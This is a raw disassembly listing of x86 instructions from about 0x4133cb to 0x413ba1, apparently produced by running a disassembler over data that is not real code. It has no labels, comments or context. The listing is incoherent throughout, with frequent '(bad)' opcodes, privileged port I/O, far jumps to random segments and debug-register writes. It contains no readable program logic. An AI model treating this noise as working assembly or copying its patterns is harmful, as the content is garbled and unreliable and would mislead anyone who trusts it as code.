  4133cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133cc:	in     eax,0x95
  4133ce:	test   BYTE PTR [edi+ecx*2-0x4a],ch
  4133d2:	xchg   edi,eax
  4133d3:	mov    ebx,0xff160a48
  4133d8:	cli    
  4133d9:	mov    al,ds:0xbd7fbe12
  4133de:	arpl   WORD PTR [esi+0x167ba136],ax
  4133e4:	push   eax
  4133e5:	jmp    0xc0b1:0x25d0ca63
  4133ec:	cli    
  4133ed:	cmc    
  4133ee:	dec    edx
  4133ef:	sbb    al,0x7a
  4133f1:	fmul   QWORD PTR [eax+0x58]
  4133f4:	push   eax
  4133f5:	ds out 0xa3,eax
  4133f8:	outs   dx,DWORD PTR ds:[esi]
  4133f9:	daa    
  4133fa:	mov    esi,0x1f14d463
  4133ff:	add    esp,DWORD PTR [ebx+0x3]
  413402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413403:	add    al,0x54
  413405:	daa    
  413406:	icebp  
  413407:	inc    ebp
  413408:	add    ah,BYTE PTR [ecx+0x3b]
  41340b:	call   0x102d7e60
  413410:	fs not ecx
  413413:	jno    0x41339f
  413415:	enter  0x7d6,0xeb
  413419:	pop    es
  41341a:	sbb    DWORD PTR [edi+0x64],0xfab8609c
  413421:	and    ah,BYTE PTR [edi-0x3e]
  413424:	push   edx
  413425:	pushf  
  413426:	and    al,0x6b
  413428:	inc    esp
  413429:	dec    edx
  41342a:	and    eax,0x57e70ba8
  41342f:	and    esi,esp
  413431:	es dec eax
  413433:	jle    0x4133b7
  413435:	(bad)  
  413436:	hlt    
  413437:	lahf   
  413438:	dec    edx
  413439:	sahf   
  41343a:	lods   al,BYTE PTR ds:[esi]
  41343b:	or     BYTE PTR ds:0xd9d5f348,ch
  413441:	lods   al,BYTE PTR ds:[esi]
  413442:	lods   al,BYTE PTR ds:[esi]
  413443:	xor    dl,BYTE PTR [eax+ebp*4+0x28]
  413447:	test   BYTE PTR [ebp+edx*2+0x373e19da],dh
  41344e:	test   DWORD PTR [ebp-0x2a0d65e5],ebx
  413454:	xchg   esi,eax
  413455:	mov    ecx,0x4ba11899
  41345a:	jo     0x4134bb
  41345c:	dec    ebp
  41345d:	repz js 0x41346a
  413460:	pop    eax
  413461:	sub    dl,BYTE PTR [esp+ebp*4]
  413464:	(bad)  
  413465:	in     al,dx
  413466:	dec    edi
  413467:	outs   dx,BYTE PTR ds:[esi]
  413468:	push   ecx
  413469:	jns    0x4134c4
  41346b:	mov    edi,0x14224682
  413470:	int3   
  413471:	cdq    
  413472:	dec    edx
  413473:	gs jae 0x4134ac
  413476:	lock (bad) 
  413478:	(bad)  
  413479:	adc    ebp,DWORD PTR [esi+0x26]
  41347c:	xchg   ebp,eax
  41347d:	jbe    0x41347b
  41347f:	jl     0x4134d8
  413481:	into   
  413482:	mov    DWORD PTR ds:0x1d143f37,edx
  413489:	xchg   ebp,eax
  41348a:	mov    edi,0xe0c30581
  41348f:	push   cs
  413490:	xchg   DWORD PTR [ecx+0x1b],ebp
  413493:	dec    ecx
  413494:	sbb    al,0xdc
  413496:	xchg   ebp,eax
  413497:	xor    bl,cl
  413499:	ret    
  41349a:	xor    BYTE PTR [eax-0x6ca88e00],cl
  4134a0:	sub    bl,ch
  4134a2:	add    al,BYTE PTR [esp+0x3ffe19d2]
  4134a9:	push   es
  4134aa:	lea    edx,[ebx+eiz*1+0x54]
  4134ae:	rol    BYTE PTR [ebx-0x1d8999b4],cl
  4134b4:	leave  
  4134b5:	mov    ch,0x70
  4134b7:	lock xchg esp,eax
  4134b9:	mov    esp,0xfd981aa2
  4134be:	fiadd  WORD PTR [ecx]
  4134c0:	fsubr  st(4),st
  4134c2:	repnz and eax,0xd0550108
  4134c8:	ss jne 0x413457
  4134cb:	add    BYTE PTR [ebx+0x3deec5ee],0xf3
  4134d2:	loopne 0x4134c6
  4134d4:	aad    0x28
  4134d6:	jne    0x4134b1
  4134d8:	js     0x4134da
  4134da:	xor    al,0x2f
  4134dc:	add    BYTE PTR ds:0xc396e20,ch
  4134e2:	jae    0x41353b
  4134e4:	cmp    dl,bh
  4134e6:	jb     0x413506
  4134e8:	push   edx
  4134e9:	repz add BYTE PTR [ecx+0x56],bh
  4134ed:	mov    al,ds:0x7e672d07
  4134f2:	inc    esi
  4134f3:	iret   
  4134f4:	pop    edi
  4134f5:	xchg   ebx,eax
  4134f6:	push   0x67
  4134f8:	sahf   
  4134f9:	mov    dh,0x2
  4134fb:	ror    BYTE PTR [edx],cl
  4134fd:	ins    BYTE PTR es:[edi],dx
  4134fe:	lods   al,BYTE PTR ds:[esi]
  4134ff:	mov    esi,DWORD PTR [ebx+0x38]
  413502:	mov    cl,0xef
  413504:	lods   al,BYTE PTR ds:[esi]
  413505:	mov    dl,BYTE PTR [ebx+eiz*1-0x6ce3f7df]
  41350c:	pop    esp
  41350d:	or     eax,0x93c0d063
  413512:	pop    esi
  413513:	stos   DWORD PTR es:[edi],eax
  413514:	(bad)  
  413516:	pop    ecx
  413517:	push   ebp
  413518:	inc    DWORD PTR [edi]
  41351a:	and    ecx,0xffffff8d
  41351d:	scas   al,BYTE PTR es:[edi]
  41351e:	ret    0x15b8
  413521:	push   ebp
  413522:	xchg   BYTE PTR [ecx+0x2aa9854e],dh
  413528:	fisttp DWORD PTR [eax-0x48]
  41352b:	lea    ebp,[esi]
  41352d:	ins    BYTE PTR es:[edi],dx
  41352e:	ds (bad) 
  413531:	cmp    DWORD PTR [ecx-0x69],esp
  413534:	cmp    DWORD PTR [eax-0x54],esp
  413537:	jo     0x413522
  413539:	and    al,0xa8
  41353b:	fadd   DWORD PTR [ebp+0x27e27d34]
  413541:	repz xchg edi,eax
  413543:	ret    0x929d
  413546:	or     BYTE PTR [edx],ah
  413548:	inc    esp
  413549:	std    
  41354a:	xchg   esi,eax
  41354b:	xor    dl,dh
  41354d:	dec    edi
  41354e:	fidivr DWORD PTR [eax+edi*1]
  413551:	pusha  
  413552:	mov    al,ds:0xa666e05f
  413557:	sub    esp,DWORD PTR [esi-0x54a8d9ae]
  41355d:	sbb    eax,edx
  41355f:	and    DWORD PTR [ecx-0x72b6f462],edx
  413565:	mov    ch,0xd8
  413567:	mov    fs:0x2c7a5cce,al
  41356d:	jp     0x413501
  41356f:	dec    edi
  413570:	cmp    al,0xfe
  413572:	cmp    BYTE PTR [ebp-0x2620791b],bh
  413578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413579:	addr16 xchg ebp,eax
  41357b:	cmp    al,0x84
  41357d:	shl    DWORD PTR [esi-0x6f],1
  413580:	test   al,0xf9
  413582:	fsub   QWORD PTR [ecx+0x8c6f94f]
  413588:	arpl   si,sp
  41358a:	dec    ebx
  41358b:	test   eax,0x63fd357f
  413590:	arpl   WORD PTR [esi+0x27],si
  413593:	pop    ebx
  413594:	jge    0x4135a0
  413596:	xlat   BYTE PTR ds:[ebx]
  413597:	jmp    0xf3f4afc2
  41359c:	sub    dh,BYTE PTR [ebx+ecx*2+0x30a47d32]
  4135a3:	cs jnp 0x413549
  4135a6:	ja     0x41357e
  4135a8:	xor    dh,dl
  4135aa:	out    0x54,al
  4135ac:	int3   
  4135ad:	push   ebx
  4135ae:	test   DWORD PTR ds:0x5dda19a1,esi
  4135b4:	xchg   esi,eax
  4135b5:	and    esi,eax
  4135b7:	push   esi
  4135b8:	jne    0x41362d
  4135ba:	into   
  4135bb:	sbb    eax,0x761a52b2
  4135c0:	sahf   
  4135c1:	mov    ch,0x16
  4135c3:	cmp    al,0x4f
  4135c5:	sbb    DWORD PTR ds:0x8b8dc936,0x25d8c167
  4135cf:	mov    edi,DWORD PTR [ecx]
  4135d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135d2:	mov    esi,0x74162210
  4135d7:	add    BYTE PTR [edx+0x60],ch
  4135da:	mov    cl,BYTE PTR [edi+0x74]
  4135dd:	cwde   
  4135de:	lods   al,BYTE PTR ds:[esi]
  4135df:	sub    al,0x1c
  4135e1:	nop
  4135e2:	bound  edx,QWORD PTR [ecx+0x70ae5e13]
  4135e8:	and    ah,BYTE PTR [ecx+eax*8]
  4135eb:	pop    ebx
  4135ec:	and    eax,0xd96e2a7b
  4135f1:	sub    al,0xbc
  4135f3:	mov    dh,0x40
  4135f5:	clc    
  4135f6:	fwait
  4135f7:	and    eax,0x7913cad2
  4135fc:	imul   ebx,DWORD PTR [edx+0x64f7f686],0x24
  413603:	sti    
  413604:	dec    ecx
  413605:	or     DWORD PTR [ebx+ebp*1-0x5eb8d9bc],esp
  41360c:	xor    edi,DWORD PTR [esi+edi*1-0x1f]
  413610:	out    dx,eax
  413611:	out    0xd6,al
  413613:	adc    DWORD PTR [esi-0x3a],ebp
  413616:	mov    edx,0x8731f1e1
  41361b:	ins    BYTE PTR es:[edi],dx
  41361c:	push   eax
  41361d:	jno    0x4135bf
  41361f:	sbb    ah,BYTE PTR [edi]
  413621:	cdq    
  413622:	cmp    BYTE PTR [ebx],dh
  413624:	leave  
  413625:	xor    eax,0xf037d03a
  41362a:	push   edi
  41362b:	adc    BYTE PTR [ebx-0x4972a21],ah
  413631:	iret   
  413632:	adc    ecx,DWORD PTR [ebx+ebp*4+0x4fc1f00c]
  413639:	and    al,0x39
  41363b:	mov    esp,0x56cb060
  413640:	pop    ebp
  413641:	xchg   edx,eax
  413642:	push   0x4bc136c7
  413647:	sub    esi,DWORD PTR [eax]
  413649:	(bad)  
  41364a:	cmp    bh,BYTE PTR [esi+0x655d4c1a]
  413650:	in     eax,0x89
  413652:	dec    edx
  413653:	xchg   ebx,eax
  413654:	daa    
  413655:	mov    ch,0x92
  413657:	mov    eax,ds:0xc97f705a
  41365c:	ja     0x413624
  41365e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41365f:	or     bl,cl
  413661:	sbb    DWORD PTR [ebp-0x3],ebp
  413664:	add    DWORD PTR [edx+0x6346d812],edi
  41366a:	mov    ebx,0xc1f0c62f
  41366f:	shl    BYTE PTR [edi-0x1a00a3e9],cl
  413675:	clc    
  413676:	inc    esp
  413677:	jnp    0x4136d6
  413679:	push   ss
  41367a:	jmp    0xee964a8e
  41367f:	mov    ds:0x79d23972,al
  413684:	retf   
  413685:	icebp  
  413686:	sahf   
  413687:	cmp    ch,cl
  413689:	clc    
  41368a:	(bad)  
  41368b:	hlt    
  41368c:	(bad)  
  41368d:	sub    dh,BYTE PTR [edi]
  41368f:	jbe    0x413672
  413691:	sub    DWORD PTR [ebp+eiz*2-0x1e28ebd3],esp
  413698:	mov    DWORD PTR [ecx],0x76d987f
  41369e:	lock in eax,0xf0
  4136a1:	xchg   esp,eax
  4136a2:	mov    DWORD PTR [ecx],edx
  4136a4:	leave  
  4136a5:	jnp    0x4136c1
  4136a7:	mov    edi,0xe0d18fd7
  4136ac:	sahf   
  4136ad:	or     DWORD PTR [esi+0x49],edi
  4136b0:	clc    
  4136b1:	cdq    
  4136b2:	jae    0x413728
  4136b4:	(bad)  
  4136b5:	or     ah,BYTE PTR [edi]
  4136b7:	dec    ecx
  4136b8:	add    BYTE PTR [edi+0x69],bh
  4136bb:	push   0xffffffa9
  4136bd:	dec    ebp
  4136be:	test   eax,0x5df12b33
  4136c3:	mov    edi,cs
  4136c5:	pop    ebx
  4136c6:	lock sub esi,DWORD PTR ds:0x9dbdfee2
  4136cd:	jg     0x413743
  4136cf:	test   eax,0xd36c9fc9
  4136d4:	enter  0x97a5,0x95
  4136d8:	sbb    esp,edi
  4136da:	nop
  4136db:	sub    al,0x37
  4136dd:	cs adc cl,al
  4136e0:	mov    dl,0x32
  4136e2:	mov    ch,BYTE PTR [eax-0x435fd3db]
  4136e8:	call   0xbf12:0x61bda91d
  4136ef:	outs   dx,BYTE PTR ds:[esi]
  4136f0:	push   edx
  4136f1:	xchg   ecx,eax
  4136f2:	hlt    
  4136f3:	xchg   ecx,eax
  4136f4:	or     ebp,DWORD PTR [edx+0x17]
  4136f7:	and    BYTE PTR ds:0xdba059e9,dh
  4136fd:	jbe    0x413680
  4136ff:	outs   dx,DWORD PTR ds:[esi]
  413700:	pop    ecx
  413701:	push   eax
  413702:	dec    esi
  413703:	fwait
  413704:	mov    edi,0x94bdeb02
  413709:	inc    edx
  41370a:	push   ds
  41370b:	cdq    
  41370c:	ret    
  41370d:	xchg   BYTE PTR [ebp-0x221f61b6],bh
  413713:	mov    esi,0x36a135f1
  413718:	es pop es
  41371a:	scas   al,BYTE PTR es:[edi]
  41371b:	pop    ebp
  41371c:	cmp    BYTE PTR [edi],bl
  41371e:	add    ebx,ebp
  413720:	mov    edi,0x541bd789
  413725:	cmp    al,0x4f
  413727:	mov    edx,0x31697902
  41372c:	fs xchg ebp,eax
  41372e:	pmuludq mm6,QWORD PTR [edi]
  413731:	xor    edi,esi
  413733:	sar    BYTE PTR [ecx-0xe],cl
  413736:	adc    dl,BYTE PTR [edi+esi*1]
  413739:	add    al,al
  41373b:	or     esp,eax
  41373d:	iret   
  41373e:	jge    0x41370b
  413740:	mov    edx,0xae3f487d
  413745:	lea    esp,[edi+0x6d278e6b]
  41374b:	mov    dl,0x87
  41374d:	outs   dx,BYTE PTR ds:[esi]
  41374e:	xor    esp,ebp
  413750:	mov    bh,0x5b
  413752:	dec    esp
  413754:	mov    DWORD PTR [eax-0x201838b0],esi
  41375a:	mov    al,ds:0x7daa6cd5
  41375f:	(bad)  
  413760:	pushf  
  413761:	xlat   BYTE PTR ds:[ebx]
  413762:	icebp  
  413763:	mov    al,ds:0xe44a00a
  413768:	push   ebx
  413769:	adc    al,0x7a
  41376b:	ja     0x41373a
  41376d:	dec    esp
  41376e:	sub    ebp,edi
  413770:	bnd call DWORD PTR [ecx+esi*1]
  413774:	fstp   QWORD PTR ds:0x26974182
  41377a:	ins    DWORD PTR es:[edi],dx
  41377b:	aad    0xf0
  41377d:	gs in  al,0xb8
  413780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413781:	(bad)  
  413782:	adc    esi,DWORD PTR [eax+0x2d]
  413785:	(bad)  
  413786:	xchg   ecx,eax
  413787:	pop    esi
  413788:	pop    edi
  413789:	test   ecx,esi
  41378b:	stos   DWORD PTR es:[edi],eax
  41378c:	ja     0x4137cc
  41378e:	xchg   ebp,eax
  41378f:	shl    edi,1
  413791:	repz mov eax,ds:0xe6f8ea91
  413797:	ret    
  413798:	cmp    al,0x2b
  41379a:	push   cs
  41379b:	jnp    0x413724
  41379d:	inc    ebp
  41379e:	lahf   
  41379f:	mov    WORD PTR [esi+0x7d5628ee],ss
  4137a5:	mov    al,ds:0x7c0bc2e7
  4137aa:	jo     0x413802
  4137ac:	jo     0x413802
  4137ae:	jp     0x413752
  4137b0:	pop    ss
  4137b1:	pop    es
  4137b2:	add    eax,0x5fc7f49e
  4137b7:	in     eax,0xcd
  4137b9:	or     DWORD PTR [edi-0x4a],0xffffffa2
  4137bd:	out    dx,al
  4137be:	(bad)  
  4137bf:	out    0xaf,al
  4137c1:	loope  0x413822
  4137c3:	mov    cl,BYTE PTR [ebx-0x2b]
  4137c6:	push   cs
  4137c7:	add    esi,DWORD PTR [esp+ecx*1-0x2d]
  4137cb:	mov    bl,0xce
  4137cd:	and    al,0xe2
  4137cf:	jg     0x41376f
  4137d1:	scas   eax,DWORD PTR es:[edi]
  4137d2:	outs   dx,BYTE PTR ds:[esi]
  4137d3:	add    ah,0x6d
  4137d6:	inc    edx
  4137d7:	aad    0xc1
  4137d9:	pop    edx
  4137da:	bound  eax,QWORD PTR [eax-0x61]
  4137dd:	(bad)  
  4137de:	mov    ds:0x20e4f319,eax
  4137e3:	je     0x413799
  4137e5:	int    0x99
  4137e7:	cmp    BYTE PTR [edi-0x71],0x15
  4137eb:	dec    ebp
  4137ec:	jo     0x4137f1
  4137ee:	ficomp WORD PTR [edi-0x5799c6e7]
  4137f4:	iret   
  4137f5:	and    BYTE PTR [ebx],cl
  4137f7:	call   DWORD PTR ds:0x93de544c
  4137fd:	lea    edx,[ecx]
  4137ff:	and    BYTE PTR [ecx],al
  413801:	imul   eax,ebx,0xa
  413804:	inc    edi
  413805:	xchg   edx,eax
  413806:	adc    BYTE PTR [ebx-0x2f225117],bh
  41380c:	out    0x47,al
  41380e:	sbb    esi,DWORD PTR [esi-0x19cede50]
  413814:	jge    0x413868
  413816:	loop   0x4137f9
  413818:	mov    db7,ebp
  41381b:	or     eax,DWORD PTR [ebp+0x5a]
  41381e:	out    0xaf,al
  413820:	mov    ds:0xe6e962c1,al
  413825:	jns    0x413802
  413827:	call   0xebaf3af8
  41382c:	adc    BYTE PTR [edi+0x31],0x6c
  413830:	jbe    0x413810
  413832:	mov    bh,0x5e
  413834:	cmpps  xmm1,XMMWORD PTR [eax-0x36],0x8f
  413839:	popf   
  41383a:	ins    DWORD PTR es:[edi],dx
  41383b:	scas   al,BYTE PTR es:[edi]
  41383c:	retf   0xf77f
  41383f:	(bad)  
  413840:	addr16 (bad) 
  413842:	pop    ecx
  413843:	pop    edx
  413844:	sbb    eax,0xa19b99a7
  413849:	or     eax,0x57356039
  41384e:	push   ecx
  41384f:	ins    BYTE PTR es:[edi],dx
  413850:	cmp    BYTE PTR [edx+eax*8],cl
  413853:	retf   
  413854:	retf   0xb8c6
  413857:	xor    al,ah
  413859:	test   DWORD PTR ds:0x7358e947,ebp
  41385f:	ss aas 
  413861:	or     al,BYTE PTR [eax-0xa8860f4]
  413867:	sbb    al,0xd0
  413869:	xor    BYTE PTR [eax-0x27],0xb3
  41386d:	mov    edi,0xb712dd34
  413872:	jle    0x4138d3
  413874:	imul   ecx,DWORD PTR [ebx],0x11
  413877:	clc    
  413878:	faddp  st(4),st
  41387a:	dec    esp
  41387b:	outs   dx,BYTE PTR ds:[esi]
  41387c:	push   edx
  41387d:	repnz repz and edi,DWORD PTR [edi]
  413881:	sbb    ah,BYTE PTR [edx]
  413883:	ds ja  0x413840
  413886:	cmc    
  413887:	loopne 0x413889
  413889:	aas    
  41388a:	pop    edx
  41388b:	cld    
  41388c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41388d:	imul   bh
  41388f:	or     esi,ecx
  413891:	shl    ch,0x56
  413894:	inc    esi
  413895:	addr16 pop esi
  413897:	mov    al,ds:0xb7b74b9f
  41389c:	sbb    DWORD PTR [eax],0xfb792d76
  4138a2:	push   edi
  4138a3:	inc    esp
  4138a4:	loopne 0x413895
  4138a6:	and    al,BYTE PTR [ebx+0x50]
  4138a9:	cmc    
  4138aa:	push   edi
  4138ab:	(bad)  
  4138ac:	adc    BYTE PTR ds:[esi+0x798a9383],0xb9
  4138b4:	retf   0x634f
  4138b7:	shl    al,0x66
  4138ba:	jle    0x4138c6
  4138bc:	repz sbb ch,0x57
  4138c0:	mov    ch,0x0
  4138c2:	jle    0x413941
  4138c4:	addr16 push esi
  4138c6:	mov    fs,ebx
  4138c8:	cmp    al,0x1c
  4138ca:	xchg   ebx,eax
  4138cb:	cdq    
  4138cc:	mov    eax,0x769fa24d
  4138d1:	sbb    BYTE PTR [ebx],dl
  4138d3:	in     eax,dx
  4138d4:	gs dec esi
  4138d7:	sbb    DWORD PTR [eax],esp
  4138d9:	retf   0xebdf
  4138dc:	nop
  4138dd:	icebp  
  4138de:	shr    DWORD PTR [edi-0x243cc806],cl
  4138e4:	outs   dx,DWORD PTR ds:[esi]
  4138e5:	jmp    0x413895
  4138e7:	les    ebx,FWORD PTR [eax]
  4138e9:	cld    
  4138ea:	mov    edi,0x61774ba5
  4138ef:	push   edi
  4138f0:	cmc    
  4138f1:	adc    DWORD PTR [esp+ebx*1],0xffffffac
  4138f5:	mov    eax,0x8e8147a8
  4138fa:	popa   
  4138fb:	ficomp WORD PTR [ebp+0x878af94]
  413901:	fst    st(1)
  413903:	jbe    0x413951
  413905:	dec    esi
  413906:	jb     0x4138d3
  413908:	mov    ?,WORD PTR [ecx-0x7]
  41390b:	dec    edx
  41390c:	(bad)  
  41390e:	pop    ecx
  41390f:	inc    ebp
  413910:	mov    eax,0xe482a058
  413915:	rol    DWORD PTR [ebx+esi*4+0x495035f8],0xe4
  41391d:	retf   
  41391e:	mov    dh,0x29
  413920:	ins    BYTE PTR es:[edi],dx
  413921:	mov    ebp,0xc7ccd7c2
  413926:	shr    dl,cl
  413928:	xchg   esi,eax
  413929:	inc    eax
  41392a:	test   al,0xb8
  41392c:	std    
  41392d:	cmp    BYTE PTR [ebx+0x42],al
  413930:	test   al,0x11
  413932:	cmp    DWORD PTR [edx+0x1d],esi
  413935:	and    BYTE PTR [esp+ebx*8+0x4f],0x80
  41393a:	dec    ebx
  41393b:	icebp  
  41393c:	lods   al,BYTE PTR ds:[esi]
  41393d:	inc    esp
  41393e:	xchg   edi,eax
  41393f:	jecxz  0x413984
  413941:	test   BYTE PTR [esi+0x1d],ah
  413944:	mov    esi,ebp
  413946:	mov    edi,0xc46e79cf
  41394b:	mov    bh,0xce
  41394d:	cli    
  41394e:	int    0x64
  413950:	clc    
  413951:	jmp    0xdabedd7f
  413956:	inc    esi
  413957:	xor    al,BYTE PTR [esi+0xe]
  41395a:	mov    ebx,0x8efc1d69
  41395f:	push   ebx
  413960:	mov    ebx,0x84a2e978
  413965:	mov    esp,0x67c89b9f
  41396a:	pop    edi
  41396b:	popf   
  41396c:	sub    BYTE PTR [edi-0x3d],ch
  41396f:	mov    eax,0xe2cea04
  413974:	nop
  413975:	and    al,0x5a
  413977:	pop    ds
  413978:	outs   dx,BYTE PTR ds:[esi]
  413979:	arpl   WORD PTR [edx],sp
  41397b:	sub    al,0x48
  41397d:	ja     0x41393f
  41397f:	test   al,0x51
  413981:	mov    ds:0x12ef51b3,eax
  413986:	inc    ebx
  413987:	mov    WORD PTR [ecx+0x35763338],?
  41398d:	dec    esp
  41398e:	and    esi,DWORD PTR [ebp+0x5e2d9077]
  413994:	adc    al,al
  413996:	dec    edx
  413997:	(bad)  
  413998:	xchg   esp,eax
  413999:	out    0xfe,eax
  41399b:	std    
  41399c:	dec    esp
  41399d:	gs sti 
  41399f:	sbb    ah,BYTE PTR [edx]
  4139a1:	dec    eax
  4139a2:	idiv   BYTE PTR [ebp-0x4cf95338]
  4139a8:	pop    edi
  4139a9:	hlt    
  4139aa:	iret   
  4139ab:	(bad)  
  4139ac:	or     eax,0xe4e24ca4
  4139b1:	lds    edx,FWORD PTR [edx]
  4139b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b4:	jmp    0x8c3e627f
  4139b9:	dec    ecx
  4139ba:	shr    BYTE PTR [esi+0x4],0x6d
  4139be:	sbb    BYTE PTR [eax-0x14],0xdb
  4139c2:	shl    BYTE PTR [edx+0x2],1
  4139c5:	test   DWORD PTR [ebp+0x6888e102],eax
  4139cb:	cmp    al,0x9e
  4139cd:	sub    esp,esp
  4139cf:	in     al,0x11
  4139d1:	fistp  QWORD PTR [ecx+0x6e]
  4139d4:	imul   esi,DWORD PTR [edi+0x67310aee],0x40
  4139db:	pop    edx
  4139dc:	xchg   esp,eax
  4139dd:	mov    ah,0x64
  4139df:	or     eax,0xe66a882c
  4139e4:	xchg   edx,eax
  4139e5:	push   ss
  4139e6:	mov    ebx,0xc608d922
  4139eb:	sub    DWORD PTR [edx],0xffffffd5
  4139ee:	pop    es
  4139ef:	adc    DWORD PTR [ecx-0x6d],0xe09ace6b
  4139f6:	mov    edi,0x619eecb4
  4139fb:	pop    ds
  4139fc:	neg    DWORD PTR [eax]
  4139fe:	or     BYTE PTR [esi-0xf6facbf],0xf2
  413a05:	ins    BYTE PTR es:[edi],dx
  413a06:	aas    
  413a07:	call   0xe36f2cc7
  413a0c:	call   0x4b4c1883
  413a11:	push   cs
  413a12:	pop    ss
  413a13:	jnp    0x41399b
  413a15:	jbe    0x4139fd
  413a17:	fld    DWORD PTR [ecx*2+0x53be3482]
  413a1e:	(bad)  
  413a20:	aas    
  413a21:	hlt    
  413a22:	or     al,0x64
  413a24:	pop    ds
  413a25:	jmp    0x7e3a446b
  413a2a:	add    DWORD PTR [edi+0x44],0x6d
  413a2e:	pop    eax
  413a2f:	sti    
  413a30:	lea    eax,ds:0x8ce70bb8
  413a36:	jbe    0x413a5f
  413a38:	repnz cmp bh,dl
  413a3b:	xchg   edx,eax
  413a3c:	aam    0x46
  413a3e:	pop    esi
  413a3f:	ins    DWORD PTR es:[edi],dx
  413a40:	ins    DWORD PTR es:[edi],dx
  413a41:	addr16 mov ah,0xbd
  413a44:	lods   al,BYTE PTR ds:[esi]
  413a45:	sbb    eax,0x2597d442
  413a4a:	sbb    al,0xcd
  413a4c:	les    eax,FWORD PTR [eax+0x47c26243]
  413a52:	popa   
  413a53:	xchg   ecx,eax
  413a54:	gs dec edx
  413a56:	arpl   WORD PTR [edx],sp
  413a58:	xchg   esi,eax
  413a59:	mov    bh,0x9b
  413a5b:	std    
  413a5c:	aad    0xa6
  413a5e:	call   DWORD PTR [eax]
  413a60:	test   al,0x3
  413a62:	mov    cl,0x1a
  413a64:	pop    esi
  413a65:	lea    ecx,[edx-0x55]
  413a68:	std    
  413a69:	push   0xafadc0de
  413a6e:	sbb    al,0x19
  413a70:	dec    esi
  413a71:	bound  ecx,QWORD PTR [esi+0x76943ff0]
  413a77:	in     eax,0x1f
  413a79:	mov    BYTE PTR [esi-0x3],dh
  413a7c:	cmp    bl,BYTE PTR [eax]
  413a7e:	imul   edx,DWORD PTR [eax+0x2b],0xffffffe8
  413a82:	inc    edx
  413a83:	sbb    al,0x43
  413a85:	jmp    0x1de27de8
  413a8a:	pop    edi
  413a8b:	mov    dl,0x69
  413a8d:	ss pop edx
  413a8f:	shl    DWORD PTR [eax+0x44],1
  413a92:	mov    esp,0xa8e3b87d
  413a97:	loopne 0x413b09
  413a99:	cli    
  413a9a:	mov    ebx,0xfeac4f25
  413a9f:	test   DWORD PTR [edx-0x1a4c4de5],edx
  413aa5:	pop    ds
  413aa6:	out    0x42,al
  413aa8:	and    ecx,0xffffffb2
  413aab:	mov    dh,0x50
  413aad:	in     eax,dx
  413aae:	push   esp
  413aaf:	ret    0x60e8
  413ab2:	jl     0x413a38
  413ab4:	js     0x413a3f
  413ab6:	jp     0x413ab6
  413ab8:	add    edx,DWORD PTR [ecx+0x2]
  413abb:	loop   0x413af3
  413abd:	dec    esi
  413abe:	shl    BYTE PTR [eax],cl
  413ac0:	inc    esp
  413ac1:	mov    ds:0x276b9fe9,eax
  413ac6:	mov    eax,ds:0xd8c5ef9c
  413acb:	aam    0x6a
  413acd:	mov    cl,BYTE PTR [edx]
  413acf:	mov    esp,DWORD PTR [ebx+0x7194e090]
  413ad5:	sbb    DWORD PTR [esi-0x1a],eax
  413ad8:	test   eax,0x61fc90c9
  413add:	mov    ds:0xecfdc668,eax
  413ae2:	cmp    edx,edx
  413ae4:	cmc    
  413ae5:	repnz test esp,ecx
  413ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae9:	dec    eax
  413aea:	pop    ebx
  413aeb:	xchg   edx,eax
  413aec:	cwde   
  413aed:	sbb    al,BYTE PTR [eax+0x32580323]
  413af3:	iret   
  413af4:	call   0xffc5:0xcd2be75a
  413afb:	fwait
  413afc:	jmp    0x2299:0x6d2fee8e
  413b03:	sbb    BYTE PTR [ebx-0x267026ea],0x4a
  413b0a:	push   esp
  413b0b:	ds int 0x5e
  413b0e:	(bad)  
  413b10:	cdq    
  413b11:	fmul   QWORD PTR [edx+edx*1-0x39]
  413b15:	(bad)  
  413b16:	mov    cl,0x94
  413b18:	retf   
  413b19:	pushf  
  413b1a:	ss mov dh,0x83
  413b1d:	ja     0x413b02
  413b1f:	sub    edx,DWORD PTR [edx-0x7e]
  413b22:	inc    ebx
  413b23:	pop    ecx
  413b24:	xor    al,BYTE PTR [esi]
  413b26:	mov    cl,0xec
  413b28:	xlat   BYTE PTR ds:[ebx]
  413b29:	test   BYTE PTR [esi+0x5d527991],bl
  413b2f:	mov    WORD PTR [edi+esi*2],?
  413b32:	iret   
  413b33:	popf   
  413b34:	idiv   DWORD PTR [ecx]
  413b36:	(bad)  
  413b37:	or     eax,0x114c22e3
  413b3c:	inc    ebx
  413b3d:	retf   
  413b3e:	scas   eax,DWORD PTR es:[edi]
  413b3f:	jle    0x413b82
  413b41:	fcmovnb st,st(2)
  413b43:	cwde   
  413b44:	(bad)  
  413b45:	sar    DWORD PTR [edi-0x4d1ddef4],1
  413b4b:	sbb    eax,0x8fa1223c
  413b50:	jle    0x413ad4
  413b52:	clc    
  413b53:	xchg   BYTE PTR [eax-0x47],al
  413b56:	in     al,dx
  413b57:	js     0x413b8f
  413b59:	xchg   edx,eax
  413b5a:	ja     0x413b39
  413b5c:	xchg   bl,bl
  413b5e:	in     al,0x42
  413b60:	push   cs
  413b61:	test   al,0x5b
  413b63:	out    0xf3,eax
  413b65:	add    esp,DWORD PTR [edi+0x6663fb46]
  413b6b:	outs   dx,DWORD PTR ds:[esi]
  413b6c:	loopne 0x413b14
  413b6e:	cmp    eax,0xb11d779e
  413b73:	aas    
  413b74:	mov    edx,0x5d2d441c
  413b79:	aad    0x17
  413b7b:	and    al,0x94
  413b7d:	cmp    al,0xa8
  413b7f:	outs   dx,BYTE PTR ds:[esi]
  413b80:	push   es
  413b81:	sbb    al,BYTE PTR [edx]
  413b83:	inc    edx
  413b84:	pop    es
  413b85:	mov    ds:0xa9a4d780,eax
  413b8a:	je     0x413b3e
  413b8c:	mov    esi,ds
  413b8e:	xchg   ecx,eax
  413b8f:	push   ss
  413b90:	loopne 0x413b91
  413b92:	imul   ebp,ecx,0xf29200ca
  413b98:	std    
  413b99:	xor    DWORD PTR [ebx+ecx*1+0x16317a43],edx
  413ba0:	hlt    
  413ba1:	push   ebp
